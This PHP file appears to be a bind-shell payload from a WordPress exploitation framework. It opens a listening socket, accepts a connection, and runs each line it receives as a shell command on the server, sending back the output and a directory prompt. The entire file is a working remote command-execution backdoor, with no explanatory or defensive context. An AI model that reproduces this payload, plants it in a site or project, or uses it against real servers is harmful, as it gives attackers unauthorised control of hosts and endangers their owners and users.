<?php
  $scl = 'socket_create_listen';
  if (is_callable($scl) && !in_array($scl, $wpxf_disabled)) {
    $sock = @$scl($port);
  }
  else {
    $sock = @socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
    $ret = @socket_bind($sock, 0, $port);
    $ret = @socket_listen($sock, 5);
  }

  $msg_sock=@socket_accept($sock);
  @socket_close($sock);

  $output = getcwd().' > ';
  @socket_write($msg_sock, $output, strlen($output));

  while (FALSE !== @socket_select($r = array($msg_sock), $w = NULL, $e = NULL, NULL)) {
    $output = '';
    $cmd = @socket_read($msg_sock, 2048, PHP_NORMAL_READ);

    if (FALSE === $cmd) { break; }
    if (substr($cmd, 0, 3) == 'cd ') {
      chdir(substr($cmd, 3, -1));
      $output = getcwd().' > ';
    }
    else if (substr($cmd, 0, 4) == 'quit' || substr($cmd, 0, 4) == 'exit') {
      break;
    }
    else {
      if (false === strpos(strtolower(PHP_OS), 'win')) {
        $cmd = rtrim($cmd).' 2>&1';
      }

      $output = $wpxf_exec($cmd);
      $output .= getcwd().' > ';
    }

    @socket_write($msg_sock, $output, strlen($output));
  }
  
  @socket_close($msg_sock);
?>
